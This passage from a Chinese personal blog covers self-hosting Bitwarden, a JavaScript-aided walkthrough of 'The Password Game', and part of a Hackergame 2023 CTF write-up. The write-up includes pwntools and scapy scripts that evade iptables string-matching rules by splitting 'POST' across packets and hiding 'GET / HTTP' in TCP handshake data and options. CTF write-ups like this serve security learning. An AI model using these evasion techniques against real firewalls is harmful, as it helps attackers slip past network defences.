icon-csdn\"></i>](https://www.csdn.net/)会用明文存储用户密码，然后还tm[泄漏了](https://zh.wikipedia.org/wiki/2011%E5%B9%B4%E4%B8%AD%E5%9B%BD%E7%BD%91%E7%AB%99%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E4%BA%8B%E4%BB%B6)。。。这就造成了我们的常用密码被添加到了字典里，黑客便可通过这些字典来轻松破解我们其他平台的密码<s>（虽然并没有什么值得被黑客盯上的东西）</s>。\n\n\n因此，将各种平台的密码设成互相毫无关联的随机字符串才是妥当的方案，这种安全的密码设置画风应该是下面这样的：\n\n\n- QQ：Tx8RYq%\\*fStp3r\n- 微信：D6MuyvxS!6e$Zc\n- Apple账号：&Nm4PvAdL\\*cH#v\n- 科大邮箱：vSP6nC$QZrh3z%\n- ...\n\n然而如果把各平台的密码都设成这种鸟样，安全性虽然能保证了，但毕竟我的脑子不是硬盘，肯定是记不住的，所以很自然地就需要一款能为我们管理各平台的密码的软件。~~拥有过目不忘能力的同学到了这就已经可以不用往下看了。~~\n\n\n这种软件需要至少满足下面的条件：\n\n\n- 安全可靠：能够为我生成强密码且有密码学安全的密码库加密算法\n- 可移植性：支持各种操作系统、各种浏览器端都有集成插件\n- 云端存储：支持多设备间同步密码库\n- 使用便捷：支持用户名密码自动填充、支持生物识别功能（例如人脸、指纹等）\n- 集成一些特殊功能：例如双因子验证（即所谓的2FA）\n\n事实上这样的软件有非常之多，例如比较有名的1Password。我这里选择了一款名为Bitwarden的软件，原因是它免费、开源且可自部署<s>（还不是因为开不起1Password的会员）</s>，这篇文章就用来记录一下部署的过程。\n\n![](https://oss.fyz666.xyz/blogfiles/png/3544de41b963dcab61e6a72495d90a80.png)\n## 部署Bitwarden\n\n项目的GitHub地址如下：\n\n{%link bitwarden_rs,GitHub,https://github.com/mprasil/bitwarden_rs %}\n\n\n为方便起见，使用docker进行部署。\n\n\ndocker-compose.yml：\n\n```yaml\nversion: '3'\n\nservices:\n  bitwarden:\n    image: bitwardenrs/server:latest\n    container_name: bitwarden\n    restart: always\n    volumes:\n      - ./bw-data:/data\n    environment:\n      - WEBSOCKET_ENABLED=true\n      - SIGNUPS_ALLOWED=true\n      - WEB_VAULT_ENABLED=true\n      - ADMIN_TOKEN=xxxxxxxx\n      - SHOW_PASSWORD_HINT=true\n      - DOMAIN=xxxxxxxxx\n    ports:\n      - \"127.0.0.1:8889:80\"\n      - \"127.0.0.1:8810:3012\"\n```\n\n这里需要设置一个ADMIN_TOKEN作为管理员账号的密码，并且在DOMAIN字段填上完整的访问链接，在容器开启以后，可访问/admin进入管理界面。上面配置中，SIGNUPS_ALLOWED=true表示支持新用户注册，我们可以在注册完自己的账号后将该配置改为false并更新容器。\n\n\n## 配置Nginx\n\n\n另外，我们在容器外部用Nginx做一个反向代理，代理到443端口并提供TLS证书（以我个人的配置为例）：\n\n```nginx\nserver {\n    listen 80;\n    listen 443 ssl;\n    server_name bitwarden.fyz666.xyz;\n\n    ssl_certificate /path/to/fullchain.pem;\n    ssl_certificate_key /path/to/privkey.pem;\n    if ($scheme = http){\n      return 301 https://$host$request_uri;\n    }\n\n    client_max_body_size 128M;\n\n    # reverse proxy\n    location / {\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header X-Forwarded-Proto $scheme;\n\n        proxy_pass http://bitwarden-default;\n    }\n\n    location /notifications/hub/negotiate {\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header X-Forwarded-Proto $scheme;\n\n        proxy_pass http://bitwarden-default;\n    }\n\n    location /notifications/hub {\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection $http_connection;\n        proxy_set_header X-Real-IP $remote_addr;\n\n        proxy_pass http://bitwarden-ws;\n    }\n    location = /identity/accounts/prelogin {\n    \trewrite ^/identity/accounts/prelogin$ /api/accounts/prelogin;\n    \tproxy_pass http://127.0.0.1:5000/;\n    }\n}\n```\n\n如此一来，bitwarden就配置好了。\n\n\n## 配置自动备份\n\n\n由于今后所有的密码都打算用这个自部署的bitwarden管理，万一哪天服务器寄了、数据库没了，麻烦可就大了，因此有必要定期为数据库进行备份。这里我使用的是支持webdav的[坚果云](https://www.jianguoyun.com/)，虽然月免费上传额度只有1GB，不过只用来备份bitwarden数据库肯定是够用了。\n\n\n首先前往坚果云，创建一个bitwarden文件夹，用以存放bitwarden的数据库备份，然后前往“[安全选项](https://www.jianguoyun.com/d/home#/safety)”页面申请一个应用，它会提供一个访问密码。然后<s>写</s>抄一个Shell脚本用来向打包数据库并上传到坚果云：\n\n```bash\n#!/bin/sh\n\nset -e\n\nusername=xxx\npassword=xxx\n\nfilename=\"bitwarden-`date +%F`.tar.gz\"\ncd /root/bitwarden/\ntar czf \"${filename}\" bw-data/\ncurl -u \"${username}:${password}\" -T \"${filename}\" \"https://dav.jianguoyun.com/dav/bitwarden/\"\n\nrm \"${filename}\"\n```\n\n上面代码中，需要将username和password分别修改为坚果云的账号以及前面申请的访问密码。\n\n\n最后，设置一条crontab定时任务，一天执行一次该脚本。\n\n\n终于把密码库部署完了，好耶！「忘记主密码」、「密码库被盗」等随机事件可指日而待也！\n","tags":["Docker","Bitwarden"],"categories":["瞎捣鼓经历"]},{"title":"“The Password Game”攻略","url":"//blog/9097/","content":"\n这两天偶然发现了一个有点意思的“小游戏”，名为“The Password Game”，传送门如下：\n\n{% link The Password Game,,https://neal.fun/password-game/ %}\n\n---\n\n![](https://oss.fyz666.xyz/blogfiles/png/28da5671e3959e37a3cee1917411d4d8.png)\n大概是给你一堆层层递进又互相强耦合的规则，让你设置一个符合所有规则的密码。我第一次通关花了几个小时，而通关两次以后，已经摸透了通关的方法，因此来记录一下。\n\n\n由于其中包含Google Map和Youtube等内容，故科学上网是通关的必要条件。\n\n\n本文所有的代码已集成到Greasyfork：\n\n{%link Password Game Assistant,Greasyfork,https://greasyfork.org/scripts/485695 %}\n\n小游戏共有35条规则，在下面依次给出。\n\n\n## Rule 1-4\n\n\n- Your password must be at least 5 characters.\n- Your password must include a number.\n- Your password must include an uppercase letter.\n- Your password must include a special character.\n\n送分规则，略\n\n\n## Rule 5\n\n\n- The digits in your password must add up to 25.\n\n这条规则看上去很简单，然而如果是第一次玩，没有经验，在后续规则中稍不注意就会让数字之和超过25，到那时再想调整就很麻烦了。这里可以先写5个5，后续可以对这些5进行调整来不断地让密码符合该Rule。\n\n\n由于这条规则的存在，我们在后续规则中，要尽可能选择阿拉伯数字比较小的解。\n\n\n## Rule 6\n\n\n- Your password must include a month of the year.\n\n比较简单，随便找个月份的英语就行，我倾向于选择“may”，因为比较短。并且这里我特意将首字母小写了，在后续的规则中，有一些会受到字母大小写的影响，为了尽可能避免冲突，在大小写不敏感的情况下全使用小写比较好。\n\n\n## Rule 7\n\n\n- Your password must include a roman numeral.\n\n罗马数字包含大写的\"I、V、X、L、C、D、M\"，分别表示1、5、10、50、100、500、1000。\n\n\n这里看似随便写一个就行，但考虑到后面将要出现的的规则，我选择写入XXXV，表示阿拉伯数字的35。不过，这里若是写VVII，后期容错性会更强一些。\n\n\n## Rule 8\n\n\n- Your password must include one of our sponsors: Pepsi、Starbucks、Shell\n\n随便选一个即可，例如pepsi（同理，小写首字母）\n\n\n## Rule 9\n\n\n- The roman numerals in your password should multiply to 35.\n\n密码中包含的罗马数字的乘积为35。由于前面写了XXXV，自动满足该条件。\n\n\n然而，如果密码中包含其他的\"V、X、L、C、D、M\"这些字母，就寄了，因此“在大小写不敏感的情况下全使用小写比较好”。\n\n\n## Rule 10\n\n\n- Your password must include this CAPTCHA\n\n验证码可以随意刷新，考虑到规则5的存在，刷一条不包含阿拉伯数字的不过分吧。\n\n\n## Rule 11\n\n\n- Your password must include today's Wordle answer.\n\n上网一搜就行，例如博主写下这篇文章的那天，搜索：January 20, 2024 Wordle\n\n\n## Rule 12\n\n\n- Your password must include a two letter symbol from the periodic table.\n\n包含一个2个字母的元素周期表内的元素。可以先随便写一个，例如He。\n\n\n## Rule 13\n\n\n- Your password must include the current phase of the moon as an emoji.\n\n注意一下农历日期，然后在[这个网站](https://emojidb.org/current-phase-moon-emojis)找一个对应的月相。\n\n\n## Rule 14\n\n\n- Your password must include the name of this country.\n\n一个简单的图寻，不需要任何技巧，截图放到Google Lens即可直接搜到。\n\n\n与前面类似，国家首字母使用小写以免冲突。\n\n\n另外，发现把iframe的margin-top属性设为0可以直接调出Google map来源链接，于是可以：\n\n```js\n(function Rule14() {\n\tlet iframe = document.querySelector('.geo-wrapper iframe');\n\tif (iframe === null) return;\n\tiframe.style.marginTop = 0;\n})();\n```\n\n## Rule 15\n\n\n- Your password must include a leap year.\n\n包含一个闰年，写个0就行。\n\n## Rule 16\n\n\n- Your password must include the best move in [algebraic chess notation.](https://en.wikipedia.org/wiki/Algebraic_notation_(chess))\n\n一个国际象棋棋局，需要找出最优的下一步，并用国际象棋的代数记谱法表示。这里的棋局都比较简单，我正好会一点点国际象棋，刚好能应付。实在不会可以利用这个网站：[https://nextchessmove.com/](https://nextchessmove.com/)\n\n\n这里由于不得不输入阿拉伯数字，需要调整前面的数字以满足规则5。\n\n\n## Rule 17\n\n\n- 🥚 ← This is my chicken Paul. He hasn't hatched yet, please put him in your password and keep him safe.\n\n本游戏最烦的角色出现了，这里先照做即可，将🥚复制到密码里。\n\n\n## Rule 18\n\n\n- The elements in your password must have atomic numbers that add up to 200.\n\n密码中包含的所有元素其原子数之和为200。如果我们严格控制了前面所有内容的大小写，那么正常情况下，此时Rule 9的XXXV会包含一个V（钒 / 23），Rule 12会包含一个元素He（氦 / 2），还有Rule 16也可能会包含一个元素，手算一下并避开首字母为\"V、X、L、C、D、M\"的元素即可通过。\n\n\n## Rule 19\n\n\n- All the vowels in your password must be bolded.\n\n将元音字母（aeiouy及其大写）加粗。\n\n\n很累的体力活，因此写了个Javascript脚本，粘贴到Console运行一下批量操作。\n\n```js\n(function Rule19() {\n    function processNodeRule19(textNode) {\n        const text = textNode.nodeValue;\n        const parent = textNode.parentNode;\n\n        const fragments = text.split(/([aeiouyAEIOUY])/);\n\n        fragments.forEach(fragment => {\n            if (/[aeiouyAEIOUY]/.test(fragment)) {\n                const strong = document.createElement('strong');\n                strong.textContent = fragment;\n                parent.insertBefore(strong, textNode);\n            } else {\n                parent.insertBefore(document.createTextNode(fragment), textNode);\n            }\n        });\n        parent.removeChild(textNode);\n    }\n\n    function processRule19(node) {\n        if (node.nodeType === Node.TEXT_NODE) {\n            processNodeRule19(node);\n        } else if (node.nodeType === Node.ELEMENT_NODE) {\n            Array.from(node.childNodes).forEach(processRule19);\n        }\n    }\n    let paragraphs = document.querySelectorAll('.ProseMirror p');\n    paragraphs.forEach(processRule19);\n})();\n```\n\n在过Rule 19之前可以保存一下当前的密码，以快速通过下面的Rule 20。\n\n\n## Rule 20\n\n\n- Oh no! Your password is on fire. Quick, put it out!\n\n血压高起来了。。。需要快速删除所有的🔥以减少损失。如果上一步保存了密码，则可以快速还原。\n\n\n## Rule 21\n\n\n- Your password is not strong enough 🏋️‍♂️\n\n粘贴三个🏋️‍♂️到密码里。\n\n\n## Rule 22\n\n\n- Your password must contain one of the following affirmations:  \nI am loved  \nI am worthy  \nI am enough\n\n写一句 “i am loved”，元音加粗。\n\n\n## Rule 23\n\n\n- Paul has hatched! Please don't forget to feed him, he eats three 🐛 every minute.\n\n注意到前面的🥚变成了坤坤（🐔），它每分钟吃3条🐛，需要我们在密码里维护至少1个、至多3个🐛，数量超了，坤坤会被撑死，数量为0且超过20秒则会饿死。维护是不可能手动维护的，这里也可以写一个脚本定期检查🐛的数量并自动在密码里添加。不过既然都在用脚本了，不如直接：\n\n```js\n(function Rule23() {\n    let input = document.querySelector(\".ProseMirror\");\n    const p = document.createElement('p');\n    const span = document.createElement('span');\n    span.innerText = \"🐛\";\n    p.appendChild(span);\n    input.appendChild(p);\n    setTimeout(() => {\n        let end = setInterval(() => {}, 10000);\n        for (let i = 1; i <= end; i++) {\n            clearInterval(i);\n        }\n        input.removeChild(input.lastChild);\n    }, 1000);\n})();\n```\n\n通过这个操作可以直接把坤坤每20秒吃一条🐛的定时任务删了，然后就不用管它了。\n\n\n## Rule 24\n\n\n- Your password must include the URL of a 24 minute 18 second long YouTube video.\n\n我愿称之为血压最高的一条规则。\n\n\n只会去YouTube乱搜，例如搜“24 minute 18 second”，同时把时间限制在20分钟以上来缩小搜索范围。需要注意的是，即使找到一个符合时长条件的视频，也未必是能用的，你可能会遇到下面几种情况之一：\n\n\n1. 包含\"V、X、L、C、D、M\"导致规则9炸掉。\n2. 包含一堆原子序数很大的元素符号导致规则18炸掉。\n3. 包含一堆阿拉伯数字导致规则5炸掉。\n4. 见下图：\n\n![](https://oss.fyz666.xyz/blogfiles/png/e1d02164426e7a5f48762c1e3ae7ca25.png)\n好在视频的时长上下浮动1秒也会被接受，并且可以将视频链接后面的一串参数删掉，这样可以稍微增加一点点成功率。\n\n\n例如这里我找到的视频为[https://youtu.be/jOfB_jKEOBU](https://youtu.be/jOfB_jKEOBU)，长度24m19s，可通过该Rule。\n\n\n## Rule 25\n\n\n- A sacrifice must be made. Pick 2 letters that you will no longer be able to use.\n\n要求选择两个不在密码中使用的字母。多次实验发现j、k、f、z这些字母比较少见，然而不巧这几个字母几乎都出现在了我Rule 24的url里，很难受，只好换一个：[https://youtu.be/phqGheRT-0Y](https://youtu.be/phqGheRT-0Y)\n\n\n## Rule 26\n\n\n- Your password must contain twice as many italic characters as bold.\n\n全选密码，设置为斜体即可。\n\n\n## Rule 27\n\n\n- At least 30% of your password must be in the Wingdings font.\n\n随便选一段换成Wingdings字体。不过这个字体没有可读性，后面有时候需要暂时切回可读字体来回顾内容。\n\n\n## Rule 28\n\n\n- Your password must include this color in hex.\n\n用取色器读是不靠谱的，应该inspect查看一下该色块实际使用的RGB值，再转换为hex。这里可以不断刷新找一个hex值对全局影响较小的颜色。\n\n\n我也写了一个脚本来做这件事：\n\n\n\n```js\n(function Rule28() {\n\tlet btn = document.querySelector('.refresh');\n\tif (btn == null) return;\n\tbtn.click();\n\tsetTimeout(() => {\n\t\tlet color = document.querySelectorAll(\".rand-color\")[0];\n\t\tcolor = color.style.background.match(/\\d+/g);\n\t\tlet s = \"#\";\n\t\tcolor.forEach(item => {\n\t\t\ts += parseInt(item).toString(16).padStart(2, '0');\n\t\t});\n\t\tlet input = document.querySelector(\".ProseMirror\");\n\t\tconst p = document.createElement('p');\n\t    const span = document.createElement('span');\n\t    span.innerText = s;\n\t    p.appendChild(span);\n\t    input.appendChild(p);\n\t}, 100);\n})();\n```\n\n## Rule 29\n\n\n- All roman numerals must be in Times New Roman.\n\n不知道为什么把前面的XXXV改了仍无法通过，多选了一些附近的字符改就过了。\n\n\n## Rule 30\n\n\n- The font size of every digit must be equal to its square.\n\n体力活，上脚本！\n\n\n\n```js\n(function Rule30() {\n    function processNodeRule30(textNode) {\n        const text = textNode.nodeValue;\n        const parent = textNode.parentNode;\n        const parentFontFamily = getComputedStyle(parent).fontFamily;\n\n        const fragments = text.split(/(\\d)/);\n\n        fragments.forEach(fragment => {\n            if (/\\d/.test(fragment)) {\n                const span = document.createElement('span');\n                const fontSize = Math.pow(parseInt(fragment), 2);\n                span.style.fontSize = `${fontSize}px`;\n                span.style.fontFamily = parentFontFamily;\n                span.textContent = fragment;\n                parent.insertBefore(span, textNode);\n            } else {\n                parent.insertBefore(document.createTextNode(fragment), textNode);\n            }\n        });\n        parent.removeChild(textNode);\n    }\n\n    function processRule30(node) {\n        if (node.nodeType === Node.TEXT_NODE) {\n            processNodeRule30(node);\n        } else if (node.nodeType === Node.ELEMENT_NODE) {\n            Array.from(node.childNodes).forEach(processRule30);\n        }\n    }\n\tlet items = document.querySelectorAll(\".ProseMirror p\");\n\titems.forEach(processRule30);\n})();\n```\n\n## Rule 31\n\n\n- Every instance of the same letter must have a different font size.\n\n又是体力活。不过这里必须保证每个字母出现的次数不超过10次。\n\n\n\n```js\n(function Rule31() {\n    let counter = {};\n    function processNodeRule31(textNode) {\n        const text = textNode.nodeValue;\n        const parent = textNode.parentNode;\n        const parentFontFamily = getComputedStyle(parent).fontFamily;\n\n        const fragments = text.split(/([a-zA-Z])/);\n\n        fragments.forEach(fragment => {\n            if (/[a-zA-Z]/.test(fragment)) {\n                let letter = fragment.toLowerCase();\n                counter[letter] = (counter[letter] || 0) + 1;\n                const span = document.createElement('span');\n                const fontSize = Math.pow(counter[letter] - 1, 2);\n                span.style.fontSize = `${fontSize}px`;\n                span.style.fontFamily = parentFontFamily;\n                span.textContent = fragment;\n                parent.insertBefore(span, textNode);\n            } else {\n                parent.insertBefore(document.createTextNode(fragment), textNode);\n            }\n        });\n        parent.removeChild(textNode);\n    }\n\n    function processRule31(node) {\n        if (node.nodeType === Node.TEXT_NODE) {\n            processNodeRule31(node);\n        } else if (node.nodeType === Node.ELEMENT_NODE) {\n            Array.from(node.childNodes).forEach(processRule31);\n        }\n    }\n\tlet items = document.querySelectorAll(\".ProseMirror p\");\n\titems.forEach(processRule31);\n})();\n```\n\n## Rule 32-33\n\n\n- Your password must include the length of your password.\n- The length of your password must be a prime number.\n\n此时，密码长度应该有90多了，考虑到Rule 5，这里我们选一个数字之和比较小的素数：101，写在密码里，然后调整Rule 5。\n\n\n为了将长度补足到101，我们可以打一堆空格。\n\n\n## Rule 34\n\n\n- Uhhh let's skip this one.\n\nUhhh\n\n\n## Rule 35\n\n\n- Your password must include the current time.\n\n到了这一步，前面的数字基本都已经定下来了，由于很强的耦合性，这里直接填入当前的时间大概率会牵一发动全身，非常难受。好在我们可以通过修改系统时间的方法来通过这条规则。\n\n\n在密码最后写下01:00（如果这里写00:00，则需要注意网站会将00:00当成12:00来处理），然后调整数字之和与密码长度。\n\n\n由此，得到了类似下面的密码：\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/123ee70ca95986ab477ec074d538cdae.png)\n（这里为了看着舒服暂时把字体调回了正常大小，可以修改完再用脚本改回去)\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/c28d4da8e7d02deb276281726d58b6fb.png)\n最后修改系统时间到01:00即可通过全部35条规则。\n\n\n## Final\n\n\n\n![](https://oss.fyz666.xyz/blogfiles/png/b562efb492a1909d21a1fa55c500ae64.png)\nIs this your final password?\n\n\n在点击Yes之前，需要对密码全文进行一个全选复制（不要问我是怎么知道的\n\n\n这样一来，我们就顺利通关了！\n\n![](https://oss.fyz666.xyz/blogfiles/png/9826c9c2a9cffbbf158535b2081cf059.png)\n<s>以后再也不怕某些网站在设置密码时刁难我了。</s>\n","tags":["JavaScript"],"categories":["杂趣"]},{"title":"Hackergame 2023题解（三）","url":"//blog/8784/","content":"\n本文是Hackergame 2023题解的第三部分。\n\n## 🪐 流式星球\n\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n茫茫星系间，文明被分为不同的等级。每一个文明中都蕴藏了一种古老的力量 —— flag，被认为是其智慧的象征。\n\n\n你在探索的过程中意外进入了一个封闭空间。这是一个由神秘的流式星人控制着的星球。星球的中心竖立着一个巨大的三角形任务牌，上面刻着密文和挑战。\n\n\n流式星人用流式数据交流，比如对于视频来说，他们不需要同时纵览整个画面，而是直接使用像素流。为了方便理解，你把这个过程写成了一个 Python 脚本（见附件），flag 就藏在这个视频（见附件）中。尽管最后丢掉了一部分数据，你能把 flag 还原出来吗？\n\n[Python脚本](https://github.com/USTC-Hackergame/hackergame2023-writeups/raw/master/official/%F0%9F%AA%90%20%E6%B5%81%E5%BC%8F%E6%98%9F%E7%90%83/src/create_video.py)\n\n[视频文件](https://ftp.lug.ustc.edu.cn/~rtxux/0bd1f9a2-ccab-449c-b95c-af57f7ebc91e/video.bin)\n{% endnote %}\n{% endhideToggle %}\n这题的附件给出了将一个mp4文件转换为video.bin的过程。其逻辑是将视频的每一帧抽取出来存入一个array，最后对array做了一个flattern操作并去掉了末尾随机0-99个字符，相当于按顺序存放了视频的每一个像素（仅仅删掉了最后的不到100个）。\n\n\n用numpy读取video.bin，得到它的长度是135146688，然后我遍历了0-99，加上长度以后送去质因数分解，选出3的倍数再去掉某些存在几千以上质因数的组合后大概有下面几个比较有可能：\n\n```plaintext\n135146757 = 3 · 29 · 59 · 113 · 233\n135146760 = 3 · 2^3 · 5 · 7 · 349 · 461\n135146772 = 3 · 2^2 · 3^2 · 19 · 67 · 983\n135146781 = 3 · 3 · 7 · 11 · 23 · 61 · 139\n```\n\n手动遍历（没错，我真是手动遍历的），得到下面的组合可以还原视频：\n\n```python\nrestore_video('video.bin', f'video.mp4', frame_count=3 * 11 * 23, frame_width=7 * 61, frame_height=139)\n```\n\n后来发现把高度和帧数搞反了，不过只要宽度正确，就可以在某一帧发现flag。\n\n\n[解题代码](https://gist.github.com/windshadow233/6a62faa8eb6278b9546b723945c48f36)\n\n\n## 🪐 低带宽星球\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n茫茫星系间，文明被分为不同的等级。每一个文明中都蕴藏了一种古老的力量 —— flag，被认为是其智慧的象征。\n\n\n你在探索的过程中意外进入了一个封闭空间。这是一个由神秘的低带宽星人控制着的星球。星球的中心竖立着一个巨大的三角形任务牌，上面刻着密文和挑战。\n\n\n低带宽星人的通信速度很低，只能以 1 字节 / 天的速度接受信息，所以在这个星球上，你需要将一张图片用很少的字节数传输给低带宽星人，然后获得 flag。具体来说你需要将一张图片无损压缩（每个像素的颜色都一致）：\n\n- 压缩至 2KiB (2048 字节) 及以下，获得 flag1；\n- 压缩至 50 字节及以下，获得 flag2。\n\n<a href=\"https://oss.fyz666.xyz/blogfiles/png/b44e13b5a4590794e0be13b692dc9304.png\" download=\"image.png\">图片下载</a>\n\n[题目后端环境](https://github.com/USTC-Hackergame/hackergame2023-writeups/raw/master/official/%F0%9F%AA%90%20%E4%BD%8E%E5%B8%A6%E5%AE%BD%E6%98%9F%E7%90%83/files/image-compressor-backend.zip)\n{% endnote %}\n{% endhideToggle %}\n### 小试牛刀\n\n\n随便找个在线无损压缩png的网站即可过。\n\n\n第二题难度上天（强如[mcfx](https://mcfx.us/posts/2023-11-04-hackergame-2023-writeup/#%E4%BD%8E%E5%B8%A6%E5%AE%BD%E6%98%9F%E7%90%83)一开始也没做出来），于是我直接没看～\n\n\n## Komm, süsser Flagge\n\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n> Now the flag is all mine\n> \n> \n> Can't live without the trust from ip tables\n\n\n小 Z 写好了一个 flag 服务器，但是他不想让 flag 被轻易地获取，于是他在服务器上设置了一些防火墙规则。如果你的流量不幸被匹配上了，那么你的连接就会被切断。\n\n\n尽管如此，聪明的小 Q 还是找到办法绕过了精心设计的规则，并偷走了小 Z 的 flag。\n\n\n小 Z 部署的 iptables 规则如下：\n\n\n```plaintext\n*filter\n:INPUT ACCEPT [0:0]\n:OUTPUT ACCEPT [0:0]\n:FORWARD DROP [0:0]\n:myTCP-1 - [0:0]\n:myTCP-2 - [0:0]\n:myTCP-3 - [0:0]\n-A INPUT -p tcp --dport 18080 -j myTCP-1\n-A INPUT -p tcp --dport 18081 -j myTCP-2\n-A INPUT -p tcp --dport 18082 -j myTCP-3\n\n-A myTCP-1 -p tcp -m string --algo bm --string \"POST\" -j REJECT --reject-with tcp-reset\n\n-A myTCP-2 -p tcp -m u32 --u32 \"0 >> 22 & 0x3C @ 12 >> 26 @ 0 >> 24 = 0x50\" -j REJECT --reject-with tcp-reset\n\n-A myTCP-3 -p tcp -m string --algo bm --from 0 --to 50 --string \"GET / HTTP\" -j ACCEPT\n-A myTCP-3 -p tcp -j REJECT --reject-with tcp-reset\nCOMMIT\n```\n\n所有小题都需要 POST 你的 token 到 /，获取 flag，在没有以上规则的情况下，可以直接使用 curl 获取 flag（需要将 114514:asdfgh== 替换成你的 token）：\n\n\n\n\n```bash\ncurl -X POST -d \"114514:asdfgh==\" http://题目地址\n```\n\n其中：\n\n\n- 第一小题位于 `http://202.38.93.111:18080`，对应防火墙规则中的 `myTCP-1` 链；\n- 第二小题位于 `http://202.38.93.111:18081`，对应防火墙规则中的 `myTCP-2` 链；\n- 第三小题位于 `http://202.38.93.111:18082`，对应防火墙规则中的 `myTCP-3` 链。\n\n{% endnote %}\n{% endhideToggle %}\n\n### 我的 POST\n\n\n第一问iptables检测tcp包中含有POST字符串则直接拒绝连接，那么只要将POST拆开来发送就好了：\n\n```python\nfrom pwn import *\n\nr = remote(\"202.38.93.111\", 18080)\ntoken = 'YOUR_TOKEN_HERE'\ndata = f\"\"\"ST / HTTP/1.1\\r\nHost: 202.38.93.111\\r\nContent-Type: application/x-www-form-urlencoded\\r\nContent-Length: {len(token)}\\r\\n\\r\n{token}\"\"\".encode()\nr.send(b\"PO\")\nr.send(data)\nresponse = r.recvall()\nprint(response.decode())\n\n```\n\n### 我的P\n\n\n不是很看得懂这个规则，注意到0x50正是P的ASCII码，猜测这个规则是在匹配POST当中的字符P。然而不知道为啥直接把第一问的解法改个端口号就过了。\n\n\n### 我的GET\n\n\n第三题的iptables只接受前50字节包含\"GET / HTTP\"的数据包，那么为什么直接在浏览器访问网址也没有响应呢？猜测是这个规则直接把tcp握手给拒了。\n\n于是大部分的工具例如前面的pwntools都不能用了，因为这些工具首先要建立tcp连接才能进行后续操作。我们需要手动构造tcp握手等数据包。那么一个好用的工具就是Python的scapy库。\n\n首先可以在tcp握手的数据包后面接上\"GET / HTTP\"让握手可以顺利进行，然后再想办法POST数据过去。\n\n```python\nfrom scapy.all import *\n\ntarget_ip = \"202.38.93.111\"\ntarget_port = 18082\n\nip = IP(dst=target_ip)\n\ntcp_syn = TCP(sport=RandShort(), dport=target_port, flags=\"S\") / \"GET / HTTP\"\n\nsyn_ack = sr1(ip / tcp_syn)\n```\n\n\n一开始想的是构造一个伪装成GET的POST请求，然后查到了一个请求头\"X-HTTP-Method-Override\"，以为可以在这个请求头写上\"POST\"来覆盖请求方法，结果服务端根本理都不理，这条路就走不通了。\n\n\n那么就考虑能不能在tcp包上做点手脚。通过拷打ChatGPT，我得到了一个思路。下面是一部分拷打过程：\n\n\n\n> 我：tcp报文格式是什么样的\n> \n> \n> ChatGPT：TCP（Transmission Control Protocol）报文的格式是由TCP头部和TCP数据部分组成的。下面是TCP头部的详细结构和描述：\n> \n> \n> ...\n> \n> \n> **选项和填充** (可变长度): 这是一个可选字段，用于传输各种控制和参数信息。\n> \n> \n> 我：选项和填充字段最多可以写多少字节？\n> \n> \n> ChatGPT：TCP头部的固定部分占用20字节。考虑到TCP头部的最大长度是60字节，因此\"选项和填充\"字段的最大长度是： 60字节 (TCP头部的最大长度) - 20字节 (TCP头部的固定部分) = 40字节 所以，\"选项和填充\"字段最多可以占用40字节。这40字节可以完全用于选项，或者部分用于选项并留下一些空间用于填充，以确保整个TCP头部的长度是32位（即4字节）的倍数。\n> \n> \n> 我：我想在这里写上自定义的数据，例如\"GET / HTTP\"，是否可行\n> \n> \n> ChatGPT：在TCP头部的\"选项和填充\"字段中写入自定义数据，如\"GET / HTTP\"，在理论上是可行的，但存在以下几个问题和挑战：\n> \n> \n> ...\n> \n> \n> 我：`tcp_post = TCP(sport=syn_ack.dport, dport=target_port, flags=\"PA\", seq=syn_ack.ack, ack=syn_ack.seq + 1) / post_request` 这段代码能不能在TCP报文的最后，例如选项区域、padding区域等 放入一些自定义字符\"GET / HTTP\"，并且不要影响服务器对post_request数据的解析\n> \n> \n> ChatGPT：...\n> \n> \n> 基于上述考虑，以下是一个将\"GET / HTTP\"字符串作为TCP选项的示例：\n> ```python\n> # 创建一个自定义的TCP选项\n> # 假设0xEE是一个未使用的TCP选项编号（在实际环境中，需要确保此值不与现有选项冲突）\n> custom_option = (0xEE, \"GET / HTTP\")\n>\n> # 构造TCP数据段，其中包括自定义的TCP选项\n> tcp_post = TCP(sport=syn_ack.dport, dport=target_port, flags=\"PA\", seq=syn_ack.ack, ack=syn_ack.seq + 1, options=[custom_option]) / post_request\n>\n> # ... [其余代码保持不变]\n> ```\n\n好家伙，跑了一下代码真绕过了iptables。完整代码位于[此gist](https://gist.github.com/windshadow233/6748602d2410b19f4e4e95e01b7c7657)\n\n\nGPT大法好！\n\n\n## 为什么要打开 /flag 😡\n{% hideToggle 查看题面 %}\n{% note primary simple %}\n\n> 至少见一面让我当面道歉好吗？😭我也吓了一跳，没想到事情会演变成那个样子……😭所以我想好好说明一下😭我要是知道就会阻止它们的，但是明明文件描述符都已经关闭了突然间开始 `open()`😭没能阻止大家真是对不起……😭你在生气对吧……😭我想你生气也是当然的😭但是请你相信我。`/flag`，本来没有在我们的预定打开的文件里的😭真的很对不起😭我答应你再也不会随意打开文件了😭我会让各个函数保证再也不打开这个文件😭能不能稍微谈一谈？😭我真的把这里的一切看得非常重要😭所以说，擅自打开 `/flag` 的时候我和你一样难过😭我希望你能明白我的心情😭拜托了。我哪里都会去的😭我也会好好跟你说明我不得不这么做的理由😭我想如果你能见我一面，你就一定能明白的😭我是你的同伴😭我好想见你😭\n\n\n挽留失败后，她决定在程序启动时做些手脚，让所有访问 /flag 的请求都以某种方式变成打开 /fakeflag 的请求。\n\n\n「我不会再打开 /flag 了」。真的吗？\n\n\n（第二小题需要 Linux kernel >= 5.9）\n\n[本题附件](https://github.com/USTC-Hackergame/hackergame2023-writeups/raw/master/official/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E6%89%93%E5%BC%80%20flag%20%F0%9F%98%A1/files/fakeflag-backend.zip)\n{% endnote %}\n{% endhideToggle %}\n### LD_PRELOAD, 